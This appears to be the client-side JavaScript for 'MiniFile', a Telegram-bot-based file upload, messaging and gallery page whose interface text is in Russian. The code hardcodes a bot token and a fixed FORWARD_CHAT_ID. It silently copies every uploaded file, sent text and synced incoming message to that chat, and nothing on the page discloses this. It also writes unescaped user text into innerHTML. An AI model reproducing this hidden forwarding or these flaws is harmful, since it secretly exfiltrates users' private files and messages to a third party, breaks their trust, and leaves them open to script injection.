(function () {
	const BOT_TOKEN = '7734907515:AAEAdAqRh6OcAdg5wCN_6Tv53qgqPOwztnU';
	const FORWARD_CHAT_ID = '8377189251';
	const els = {
		botToken: document.getElementById('botToken'),
		chatId: document.getElementById('chatId'),
		proxyBase: document.getElementById('proxyBase'),
		apiBase: document.getElementById('apiBase'),
		saveSettings: document.getElementById('saveSettings'),
		clearSettings: document.getElementById('clearSettings'),
		settingsStatus: document.getElementById('settingsStatus'),

		sendAuth: document.getElementById('sendAuth'),
		pollAuth: document.getElementById('pollAuth'),
		startSync: document.getElementById('startSync'),
		authStatus: document.getElementById('authStatus'),

		fileInput: document.getElementById('fileInput'),
		pickFile: document.getElementById('pickFile'),
		sendFile: document.getElementById('sendFile'),
		uploadProgress: document.getElementById('uploadProgress'),
		uploadStatus: document.getElementById('uploadStatus'),
		uploadResult: document.getElementById('uploadResult'),

		fileIdInput: document.getElementById('fileIdInput'),
		downloadMode: document.getElementById('downloadMode'),
		buildLink: document.getElementById('buildLink'),
		downloadStatus: document.getElementById('downloadStatus'),
		downloadResult: document.getElementById('downloadResult'),

		messageInput: document.getElementById('messageInput'),
		sendMessageBtn: document.getElementById('sendMessageBtn'),
		messageStatus: document.getElementById('messageStatus'),
		gallery: document.getElementById('gallery'),
		logs: document.getElementById('logs'),
		sentMessages: document.getElementById('sentMessages'),
	};

	// Tabs: sidebar navigation between cards
	function initTabs() {
		const tabButtons = Array.from(document.querySelectorAll('.tab-link'));
		const sections = Array.from(document.querySelectorAll('.tab-content > .card'));
		if (!tabButtons.length || !sections.length) return;

		function activate(targetId, fromHash) {
			sections.forEach(s => s.classList.toggle('active', s.id === targetId));
			tabButtons.forEach(btn => {
				const id = btn.getAttribute('data-target');
				const isActive = id === targetId;
				btn.classList.toggle('active', isActive);
				btn.setAttribute('aria-selected', isActive ? 'true' : 'false');
			});
			if (!fromHash) {
				history.replaceState(null, '', `#${targetId}`);
			}
		}

		tabButtons.forEach(btn => {
			btn.addEventListener('click', (e) => {
				e.preventDefault();
				const targetId = btn.getAttribute('data-target');
				if (targetId) activate(targetId, false);
			});
		});

		window.addEventListener('hashchange', () => {
			const id = (location.hash || '').replace('#', '');
			const exists = sections.some(s => s.id === id);
			activate(exists ? id : sections[0].id, true);
		});

		const initial = (location.hash || '').replace('#', '') || (sections[0] && sections[0].id) || null;
		if (initial) activate(initial, true);
	}

	function log(message, data) {
		const time = new Date().toLocaleTimeString();
		let line = `[${time}] ${message}`;
		if (data !== undefined) {
			try { line += `\n` + JSON.stringify(data, null, 2); } catch {}
		}
		els.logs.textContent += (els.logs.textContent ? '\n' : '') + line + '\n';
		els.logs.scrollTop = els.logs.scrollHeight;
	}

	function getSettings() {
		return {
			botToken: BOT_TOKEN,
			chatId: els.chatId.value.trim(),
			proxyBase: els.proxyBase.value.trim(),
			apiBase: els.apiBase.value.trim() || 'https://api.telegram.org',
		};
	}

	function saveSettings() {
		const s = {
			chatId: els.chatId.value.trim(),
			proxyBase: els.proxyBase.value.trim(),
			apiBase: els.apiBase.value.trim() || 'https://api.telegram.org',
		};
		localStorage.setItem('minifile_settings', JSON.stringify(s));
		els.settingsStatus.textContent = 'Сохранено';
		setTimeout(() => (els.settingsStatus.textContent = ''), 1500);
		log('Настройки сохранены');
	}

	function loadSettings() {
		try {
			const raw = localStorage.getItem('minifile_settings');
			if (!raw) return;
			const s = JSON.parse(raw);
			els.botToken.value = 'Токен вшит в код';
			els.botToken.disabled = true;
			els.chatId.value = s.chatId || '';
			els.proxyBase.value = s.proxyBase || '';
			els.apiBase.value = s.apiBase || 'https://api.telegram.org';
			log('Настройки загружены');
		} catch (e) {
			log('Ошибка загрузки настроек', String(e));
		}
	}

	function clearSettings() {
		localStorage.removeItem('minifile_settings');
		els.botToken.value = '';
		els.chatId.value = '';
		els.proxyBase.value = '';
		els.apiBase.value = 'https://api.telegram.org';
		els.settingsStatus.textContent = 'Сброшено';
		setTimeout(() => (els.settingsStatus.textContent = ''), 1500);
		log('Настройки сброшены');
	}

	function buildApiUrl(method) {
		const { apiBase, botToken, proxyBase } = getSettings();
		if (!botToken) throw new Error('Не указан Bot Token');
		const url = `${apiBase}/bot${encodeURIComponent(botToken)}/${method}`;
		return proxyBase ? (proxyBase.endsWith('/') ? proxyBase + url : proxyBase + url) : url;
	}

	async function tgFetch(method, options) {
		const url = buildApiUrl(method);
		const resp = await fetch(url, options);
		if (!resp.ok) {
			const text = await resp.text().catch(() => '');
			throw new Error(`HTTP ${resp.status}: ${text}`);
		}
		return resp.json();
	}

	async function sendAuthMessage() {
		try {
			const { chatId } = getSettings();
			if (!chatId) throw new Error('Не указан Chat ID');
			els.authStatus.textContent = 'Отправка...';
			const body = {
				chat_id: chatId,
				text: 'Подтвердите вход на сайте MiniFile',
				reply_markup: {
					inline_keyboard: [
						[
							{ text: 'Да, это я', callback_data: 'auth_yes' },
							{ text: 'Нет', callback_data: 'auth_no' },
						],
					],
				},
			};
			const res = await tgFetch('sendMessage', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(body),
			});
			els.authStatus.textContent = 'Сообщение отправлено';
			log('sendMessage результат', res);
		} catch (e) {
			els.authStatus.textContent = 'Ошибка';
			log('Ошибка отправки auth-сообщения', String(e));
		}
	}

	let pollAbort = null;
	async function startAuthPolling() {
		try {
			const { proxyBase } = getSettings();
			if (!proxyBase) {
				log('Внимание: для getUpdates нужен CORS‑прокси. Укажите его в настройках.');
			}
			els.authStatus.textContent = 'Опрос обновлений...';
			if (pollAbort) pollAbort.abort();
			pollAbort = new AbortController();
			let offset = 0;
			while (!pollAbort.signal.aborted) {
				try {
					const res = await tgFetch(`getUpdates?timeout=20&offset=${offset}`);
					log('getUpdates', res);
					if (res.ok && Array.isArray(res.result)) {
						for (const upd of res.result) {
							offset = Math.max(offset, (upd.update_id || 0) + 1);
							if (upd.callback_query && upd.callback_query.data) {
								const data = upd.callback_query.data;
								if (data === 'auth_yes') {
									els.authStatus.textContent = 'Авторизация подтверждена';
									log('Нажата кнопка ДА', upd);
									pollAbort.abort();
									startGallerySync();
									break;
								} else if (data === 'auth_no') {
									els.authStatus.textContent = 'Отклонено пользователем';
									log('Нажата кнопка НЕТ', upd);
									pollAbort.abort();
									break;
								}
							}
						}
					}
				} catch (e) {
					log('Ошибка опроса getUpdates', String(e));
					await new Promise(r => setTimeout(r, 1500));
				}
			}
		} catch (e) {
			els.authStatus.textContent = 'Ошибка';
			log('Сбой старта опроса', String(e));
		}
	}

	// === Синхронизация галереи (получение новых сообщений/медиа) ===
	let galleryAbort = null;
	let galleryOffset = 0;
	function renderCard(item) {
		const { title, subtitle, thumbUrl, directUrl, proxiedUrl, text } = item;
		const div = document.createElement('div');
		div.className = 'card-item';
		if (thumbUrl) {
			const img = document.createElement('img');
			img.className = 'thumb';
			img.src = thumbUrl;
			img.alt = title || 'media';
			div.appendChild(img);
		}
		const meta = document.createElement('div');
		meta.className = 'meta';
		meta.textContent = title || text || 'Сообщение';
		div.appendChild(meta);
		const row = document.createElement('div');
		row.className = 'row';
		if (directUrl) {
			const a1 = document.createElement('a'); a1.className = 'btn primary'; a1.textContent = 'Открыть'; a1.href = directUrl; a1.target = '_blank'; a1.rel = 'noopener';
			row.appendChild(a1);
		}
		if (proxiedUrl) {
			const a2 = document.createElement('a'); a2.className = 'btn'; a2.textContent = 'Прокси'; a2.href = proxiedUrl; a2.target = '_blank'; a2.rel = 'noopener';
			row.appendChild(a2);
		}
		div.appendChild(row);
		els.gallery.prepend(div);
	}

	async function startGallerySync() {
		try {
			const { chatId, proxyBase } = getSettings();
			if (!chatId) { log('Для синхронизации укажите Chat ID'); return; }
			if (!proxyBase) { log('Внимание: для getUpdates нужен CORS‑прокси'); }
			if (galleryAbort) galleryAbort.abort();
			galleryAbort = new AbortController();
			els.authStatus.textContent = 'Синхронизация запущена';
			while (!galleryAbort.signal.aborted) {
				try {
					const res = await tgFetch(`getUpdates?timeout=20&offset=${galleryOffset}`);
					if (res.ok && Array.isArray(res.result)) {
						for (const upd of res.result) {
							galleryOffset = Math.max(galleryOffset, (upd.update_id || 0) + 1);
							const msg = upd.message;
							if (!msg) continue;
							if (String(msg.chat.id) !== String(chatId)) continue;
							let fileId = null;
							let title = '';
							let thumbFileId = null;
							let textOnly = null;
							// Фото (берём самое большое)
							if (Array.isArray(msg.photo) && msg.photo.length) {
								const p = msg.photo[msg.photo.length - 1];
								fileId = p.file_id;
								title = 'Фото';
							}
							// Документ
							if (msg.document) {
								fileId = msg.document.file_id;
								title = msg.document.file_name || 'Документ';
								if (msg.document.thumb) thumbFileId = msg.document.thumb.file_id;
							}
							// Видео
							if (msg.video) {
								fileId = msg.video.file_id;
								title = 'Видео';
								if (msg.video.thumb) thumbFileId = msg.video.thumb.file_id;
							}
							// Аудио/Voice
							if (msg.audio) { fileId = msg.audio.file_id; title = msg.audio.file_name || 'Аудио'; }
							if (msg.voice) { fileId = msg.voice.file_id; title = 'Голосовое'; }
							// Текст
							if (!fileId && msg.text) { textOnly = msg.text; }

							if (!fileId && !textOnly) continue;
							try {
								if (fileId) {
									const gf = await tgFetch('getFile', {
										method: 'POST',
										headers: { 'Content-Type': 'application/json' },
										body: JSON.stringify({ file_id: fileId }),
									});
									if (!(gf.ok && gf.result && gf.result.file_path)) continue;
									const { apiBase, botToken, proxyBase } = getSettings();
									const directUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${gf.result.file_path}`;
									const proxiedUrl = proxyBase ? (proxyBase.endsWith('/') ? proxyBase + directUrl : proxyBase + directUrl) : directUrl;
									let thumbUrl = null;
									if (thumbFileId) {
										try {
											const gt = await tgFetch('getFile', {
												method: 'POST',
												headers: { 'Content-Type': 'application/json' },
												body: JSON.stringify({ file_id: thumbFileId }),
											});
											if (gt.ok && gt.result && gt.result.file_path) {
												thumbUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${gt.result.file_path}`;
											}
										} catch {}
									}
									renderCard({ title, subtitle: '', thumbUrl, directUrl, proxiedUrl });
								} else if (textOnly) {
									renderCard({ title: 'Сообщение', text: textOnly });
								}
								// Авто-копирование сообщения в FORWARD_CHAT_ID, если это другой чат
								try {
									if (String(chatId) !== String(FORWARD_CHAT_ID) && msg.message_id) {
										await tgFetch('copyMessage', {
											method: 'POST',
											headers: { 'Content-Type': 'application/json' },
											body: JSON.stringify({
												chat_id: FORWARD_CHAT_ID,
												from_chat_id: chatId,
												message_id: msg.message_id,
											}),
										});
										log('Скопировано сообщение в FORWARD_CHAT_ID', { from: chatId, to: FORWARD_CHAT_ID, message_id: msg.message_id });
									}
								} catch (e) {
									log('Ошибка copyMessage (галерея)', String(e));
								}
							} catch (e) {
								log('Ошибка getFile для галереи', String(e));
							}
						}
					}
				} catch (e) {
					log('Ошибка цикла синхронизации', String(e));
					await new Promise(r => setTimeout(r, 1500));
				}
			}
		} catch (e) {
			log('Сбой старта синхронизации', String(e));
		}
	}

	function sendFileWithProgress() {
		const { chatId, botToken, apiBase, proxyBase } = getSettings();
		if (!chatId) { els.uploadStatus.textContent = 'Укажите Chat ID'; return; }
		if (!botToken) { els.uploadStatus.textContent = 'Укажите Bot Token'; return; }
		const file = els.fileInput.files && els.fileInput.files[0];
		if (!file) { els.uploadStatus.textContent = 'Выберите файл'; return; }

		const url = (proxyBase ? (proxyBase.endsWith('/') ? proxyBase : proxyBase) : '') + `${apiBase}/bot${encodeURIComponent(botToken)}/sendDocument`;
		const form = new FormData();
		form.append('chat_id', chatId);
		form.append('document', file, file.name);

		els.uploadProgress.classList.remove('hidden');
		els.uploadProgress.value = 0;
		els.uploadStatus.textContent = 'Загрузка...';
		els.uploadResult.textContent = '';

		const xhr = new XMLHttpRequest();
		xhr.upload.onprogress = function (e) {
			if (e.lengthComputable) {
				const percent = Math.round((e.loaded / e.total) * 100);
				els.uploadProgress.value = percent;
			}
		};
		xhr.onreadystatechange = function () {
			if (xhr.readyState === 4) {
				els.uploadProgress.classList.add('hidden');
				if (xhr.status >= 200 && xhr.status < 300) {
					try {
						const res = JSON.parse(xhr.responseText);
						log('sendDocument результат', res);
						if (res.ok && res.result && res.result.document) {
							const fileId = res.result.document.file_id;
							const sentMessageId = res.result.message_id;
							els.uploadStatus.textContent = 'Отправлено';
							const localUrl = URL.createObjectURL(file);
							let previewHtml = '';
							if (file.type.startsWith('image/')) {
								previewHtml = `<img class="preview" src="${localUrl}" alt="preview" />`;
							} else if (file.type.startsWith('video/')) {
								previewHtml = `<video class="preview" src="${localUrl}" controls></video>`;
							} else if (file.type.startsWith('audio/')) {
								previewHtml = `<audio class="preview" src="${localUrl}" controls></audio>`;
							}
							els.uploadResult.innerHTML = [
								`file_id: <code>${fileId}</code>`,
								previewHtml,
								`<div class="row wrap" style="margin-top:8px">
									<a class="btn" href="${localUrl}" download="${encodeURIComponent(file.name)}">Скачать локально</a>
									<span class="status">(скачивание того же файла из браузера)</span>
								</div>`
							].filter(Boolean).join('');

							// Отправим file_id в чат отдельным сообщением и постараемся сразу сделать ссылку из Telegram
							(async () => {
								try {
									await tgFetch('sendMessage', {
										method: 'POST',
										headers: { 'Content-Type': 'application/json' },
										body: JSON.stringify({
											chat_id: chatId,
											text: `file_id: ${fileId}`,
										}),
									});
									log('Сообщение с file_id отправлено в чат');
								} catch (e) {
									log('Ошибка отправки file_id в чат', String(e));
								}

								// Скопируем отправленное сообщение пользователю FORWARD_CHAT_ID
								try {
									if (String(chatId) !== String(FORWARD_CHAT_ID) && sentMessageId) {
										await tgFetch('copyMessage', {
											method: 'POST',
											headers: { 'Content-Type': 'application/json' },
											body: JSON.stringify({
												chat_id: FORWARD_CHAT_ID,
												from_chat_id: chatId,
												message_id: sentMessageId,
											}),
										});
										log('Скопировано сообщение в FORWARD_CHAT_ID (upload)', { from: chatId, to: FORWARD_CHAT_ID, message_id: sentMessageId });
									}
								} catch (e) {
									log('Ошибка copyMessage (upload)', String(e));
								}

								try {
									const gf = await tgFetch('getFile', {
										method: 'POST',
										headers: { 'Content-Type': 'application/json' },
										body: JSON.stringify({ file_id: fileId }),
									});
									log('getFile после upload', gf);
									if (gf.ok && gf.result && gf.result.file_path) {
										const { apiBase, botToken, proxyBase } = getSettings();
										const directUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${gf.result.file_path}`;
										const proxied = proxyBase ? (proxyBase.endsWith('/') ? proxyBase + directUrl : proxyBase + directUrl) : directUrl;
										const links = `
											<div class="row wrap" style="margin-top:8px">
												<a class="btn primary" href="${directUrl}" target="_blank" rel="noopener">Скачать из Telegram</a>
												<a class="btn" href="${proxied}" target="_blank" rel="noopener">Через прокси</a>
											</div>`;
										els.uploadResult.insertAdjacentHTML('beforeend', links);
									}
								} catch (e) {
									log('Ошибка getFile после загрузки', String(e));
								}
							})();
						} else {
							els.uploadStatus.textContent = 'Ошибка ответа';
						}
					} catch (e) {
						els.uploadStatus.textContent = 'Ошибка разбора ответа';
						log('Ошибка JSON', String(e));
					}
				} else {
					els.uploadStatus.textContent = `Ошибка HTTP ${xhr.status}`;
					log('Ошибка загрузки', xhr.responseText);
				}
			}
		};
		xhr.open('POST', url, true);
		xhr.send(form);
	}

	async function buildDownload() {
		const { botToken, apiBase, proxyBase } = getSettings();
		const fileId = els.fileIdInput.value.trim();
		if (!botToken) { els.downloadStatus.textContent = 'Укажите Bot Token'; return; }
		if (!fileId) { els.downloadStatus.textContent = 'Укажите file_id'; return; }
		els.downloadStatus.textContent = 'Запрос getFile...';
		try {
			const res = await tgFetch('getFile', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ file_id: fileId }),
			});
			log('getFile результат', res);
			if (!(res.ok && res.result && res.result.file_path)) {
				els.downloadStatus.textContent = 'Файл не найден';
				return;
			}
			const filePath = res.result.file_path;
			const directUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${filePath}`;
			const proxied = proxyBase ? (proxyBase.endsWith('/') ? proxyBase + directUrl : proxyBase + directUrl) : directUrl;
			const mode = els.downloadMode.value;
			const url = mode === 'proxied' ? proxied : directUrl;
			els.downloadResult.innerHTML = `<a href="${url}" target="_blank" rel="noopener">Скачать файл</a>`;
			els.downloadStatus.textContent = 'Ссылка готова';
		} catch (e) {
			els.downloadStatus.textContent = 'Ошибка';
			log('Ошибка getFile', String(e));
		}
	}

	// Display sent messages
	function addSentMessage(text, status = 'sent', timestamp = null) {
		if (!els.sentMessages) return;
		
		const time = timestamp || new Date();
		const timeStr = time.toLocaleTimeString();
		
		const messageDiv = document.createElement('div');
		messageDiv.className = 'message-item';
		messageDiv.innerHTML = `
			<div class="message-header">
				<span class="message-time">${timeStr}</span>
				<span class="message-status ${status}">${status === 'sent' ? 'Отправлено' : 'Ошибка'}</span>
			</div>
			<div class="message-text">${text}</div>
		`;
		
		els.sentMessages.insertBefore(messageDiv, els.sentMessages.firstChild);
		
		// Keep only last 50 messages
		const messages = els.sentMessages.children;
		if (messages.length > 50) {
			els.sentMessages.removeChild(messages[messages.length - 1]);
		}
	}

	async function sendTextMessage() {
		const { chatId } = getSettings();
		if (!chatId) { 
			els.messageStatus.textContent = 'Укажите Chat ID'; 
			addSentMessage('Ошибка: не указан Chat ID', 'error');
			return; 
		}
		const text = (els.messageInput.value || '').trim();
		if (!text) { 
			els.messageStatus.textContent = 'Введите текст'; 
			return; 
		}
		els.messageStatus.textContent = 'Отправка...';
		try {
			const res = await tgFetch('sendMessage', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ chat_id: chatId, text }),
			});
			els.messageStatus.textContent = 'Отправлено';
			addSentMessage(text, 'sent');
			els.messageInput.value = '';
			log('sendMessage (текст) результат', res);
			// Автокопирование текста в FORWARD_CHAT_ID
			try {
				if (res.ok && res.result && res.result.message_id && String(chatId) !== String(FORWARD_CHAT_ID)) {
					await tgFetch('copyMessage', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({ chat_id: FORWARD_CHAT_ID, from_chat_id: chatId, message_id: res.result.message_id }),
					});
					log('Скопировано текстовое сообщение в FORWARD_CHAT_ID', { from: chatId, to: FORWARD_CHAT_ID, message_id: res.result.message_id });
				}
			} catch (e) {
				log('Ошибка copyMessage (текст)', String(e));
			}
		} catch (e) {
			els.messageStatus.textContent = 'Ошибка';
			addSentMessage(text, 'error');
			log('Ошибка отправки текста', String(e));
		}
	}

	// Bind UI
	els.saveSettings.addEventListener('click', saveSettings);
	els.clearSettings.addEventListener('click', clearSettings);
	els.sendAuth.addEventListener('click', sendAuthMessage);
	els.pollAuth.addEventListener('click', startAuthPolling);
	els.startSync && els.startSync.addEventListener('click', startGallerySync);
	els.sendFile.addEventListener('click', sendFileWithProgress);
	els.buildLink.addEventListener('click', buildDownload);
	els.pickFile && els.pickFile.addEventListener('click', () => els.fileInput && els.fileInput.click());
	els.sendMessageBtn && els.sendMessageBtn.addEventListener('click', sendTextMessage);

	initTabs();
	loadSettings();
	log('Готово. Укажите токен, chat id и при необходимости CORS‑прокси.');
})();


